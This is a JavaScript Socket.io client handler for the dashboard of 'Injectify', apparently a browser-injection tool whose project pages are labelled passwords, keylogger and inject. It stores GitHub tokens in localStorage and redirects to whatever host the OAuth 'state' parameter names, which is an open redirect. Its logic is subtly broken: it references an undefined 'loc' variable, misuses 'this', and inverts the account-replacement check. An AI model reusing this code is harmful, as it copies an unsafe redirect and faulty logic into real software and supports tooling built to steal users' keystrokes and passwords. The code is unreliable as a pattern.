import queryString from "query-string"
import url from "url"
const query = queryString.parse(location.search)
const development = process.env.NODE_ENV == 'development' ? true : false


/**
 * Socket.io handler
 */
export default (socket, store, history) => {
  const { dispatch } = store

  if (query.token) {
    localStorage.setItem(`token`, query.token)
    history.push(location.href.split('?')[0])
  }

  if (query.code) {
    if (query.state && url.parse(query.state).hostname && window.location.hostname !== url.parse(query.state).hostname) {
      location = location.href.replace(window.location.origin, `${url.parse(query.state).protocol}/\/${url.parse(query.state).host}`)
    } else {
      socket.emit(`auth:github`, loc)
      history.push(location.href.split('?')[0])
    }
  }

  socket.on(`server:info`, server => {
    let { github, discord } = server
    this.setState({
      server: server
    })
    /**
     * Append widgetbot widget if the screen width is greater than 400
     */
    if ((window.innerWidth || document.body.clientWidth) > 400 && discord && discord.server && discord.channel) {
      let crate = document.createElement(`script`)
      crate.setAttribute(`src`, `https://crate.widgetbot.io/v2`)
      let config = discord
      /**
       * Don`t preload the widget on screens under 1000px or whilst in development
       *
       * Force-delayed
       */
      if (development || (window.innerWidth || document.body.clientWidth) < 1000) config.delay = true
      crate.innerHTML = `new Crate(${JSON.stringify(config)})`
      document.head.appendChild(crate)
    }
  })

  socket.on(`auth:github`, data => {
    this.setState(data)
    if (window.crate) {
      crate.config({
        username: `@${data.user.login}`
      })
    } else {
      let timer = setInterval(() => {
        if (window.crate) {
          clearInterval(timer)
          crate.config({
            username: `@${data.user.login}`
          })
        }
      }, 1000)
    }
    if (data.success && data.token) {
      localStorage.setItem(`token`, data.token)
      let accounts = localStorage.getItem(`accounts`)
      if (!accounts) {
        accounts = [
          {
            token: data.token,
            user: {
              login: data.user.login,
              id: data.user.id,
            }
          }
        ]
      } else {
        try {
          accounts = JSON.parse(accounts)
        } catch (e) {
          accounts = [
            {
              token: data.token,
              user: {
                login: data.user.login,
                id: data.user.id,
              }
            }
          ]
        }
        let replaceIndex = false
        accounts.forEach((account, i) => {
          if (account.user.id == data.user.id) replaceIndex = i
        })
        if (replaceIndex == false) {
          accounts[replaceIndex] = {
            token: data.token,
            user: {
              login: data.user.login,
              id: data.user.id,
            }
          }
        } else {
          accounts.push({
            token: data.token,
            user: {
              login: data.user.login,
              id: data.user.id,
            }
          })
        }
      }
      localStorage.setItem(`accounts`, JSON.stringify(accounts))
      token = data.token
      this.setState({
        agreeOpen: true
      })
    }
    if (window.location.pathname.toLowerCase().slice(0, 10) == `/projects/`) {
      let project = window.location.pathname.slice(10).split(`/`)[0]

      let page = `overview`
      let tab = 0
      if (window.location.href.endsWith(`/passwords`)) { page = `passwords`; tab = 1 }
      if (window.location.href.endsWith(`/keylogger`)) { page = `keylogger`; tab = 2 }
      if (window.location.href.endsWith(`/inject`)) { page = `inject`; tab = 3 }
      if (window.location.href.endsWith(`/config`)) { page = `config`; tab = 4 }

      if (project) {
        socket.emit(`project:read`, {
          project: decodeURIComponent(project),
          page: page
        })
        this.setState({
          tab: tab
        })
      }
    }
    console.log(`%c[websocket] ` + `%cauth:github =>`, `color: #ef5350`, `color:  #FF9800`, data)
  })

  socket.on(`auth:github/stale`, data => {
    console.log(`%c[websocket] ` + `%cauth:github/stale =>`, `color: #ef5350`, `color:  #FF9800`, data)
    localStorage.removeItem(`token`)
  })

  socket.on(`user:projects`, data => {
    console.log(`%c[websocket] ` + `%cuser:projects =>`, `color: #ef5350`, `color:  #FF9800`, data)
    this.setState({
      projects: data
    })
  })

  socket.on(`project:read`, data => {
    let { page, doc } = data
    console.log(`%c[websocket] ` + `%cproject:read =>`, `color: #ef5350`, `color:  #FF9800`, data)
    this.loading(true)
    this.setState({
      project: {
        ...this.state.project,
        ...doc
      }
    })

    let tab = 0
    if (page === `passwords`) tab = 1
    if (page === `keylogger`) tab = 2
    if (page === `inject`) tab = 3
    if (page === `config`) tab = 4
    this.setState({
      tab: tab
    })
  })

  socket.on(`project:switch`, data => {
    console.log(`%c[websocket] ` + `%cproject:switch =>`, `color: #ef5350`, `color:  #FF9800`, data)

    let page = `overview`
    if (window.location.href.endsWith(`/passwords`)) page = `passwords`
    if (window.location.href.endsWith(`/keylogger`)) page = `keylogger`
    if (window.location.href.endsWith(`/inject`)) page = `inject`
    if (window.location.href.endsWith(`/config`)) page = `config`

    window.history.pushState(``, `${data.project} - Injectify`, `/projects/${encodeURIComponent(data.project)}/${page !== `overview` ? page : ``}`)
    socket.emit(`project:read`, {
      project: data.project,
      page: page
    })
  })

  socket.on(`err`, error => {
    console.error(`%c[websocket] ` + `%cerr =>`, `color: #ef5350`, `color:  #FF9800`, error)
    this.setState({
      notify: error,
      notifyOpen: true
    })
  })

  socket.on(`notify`, message => {
    console.log(`%c[websocket] ` + `%cnotify =>`, `color: #ef5350`, `color:  #FF9800`, message)
    this.notify(message)
  })

  socket.on(`disconnect`, () => {
    console.error(`%c[websocket] ` + `%cdisconnected =>`, `color: #ef5350`, `color:  #FF9800`, `abruptly disconnected`)
    this.setState({
      notify: {
        title: `Connectivity issues`,
        message: `Disconnected from server`,
        id: `reconnect`
      },
      notifyOpen: true
    })
  })
}